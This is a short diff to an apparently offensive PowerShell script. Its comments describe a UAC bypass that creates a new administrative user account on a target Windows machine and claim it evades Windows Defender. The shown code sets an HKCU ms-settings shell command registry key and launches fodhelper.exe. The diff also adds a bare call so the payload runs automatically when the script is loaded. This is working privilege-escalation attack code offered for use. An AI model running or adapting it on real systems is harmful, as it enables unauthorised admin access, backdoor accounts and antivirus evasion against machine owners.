@@ -1,4 +1,4 @@
-function helper(){ 
+function helper { 
  #This PowerShell script runs from disk - copy it to the target Windows machine, which, as of 4/30/2021, won't trigger Windows Defender.  
  #Load the script into PowerShell and run "helper" (no quotes) in the terminal.  This will generate a UAC bypass execution that creates
  #a new administrative user account on the machine.  The $custom variable below can be modified to meet your needs. 
@@ -20,3 +20,4 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -
 #Bypass Execution
 Start-Process "C:\Windows\System32\fodhelper.exe"
 }
+helper
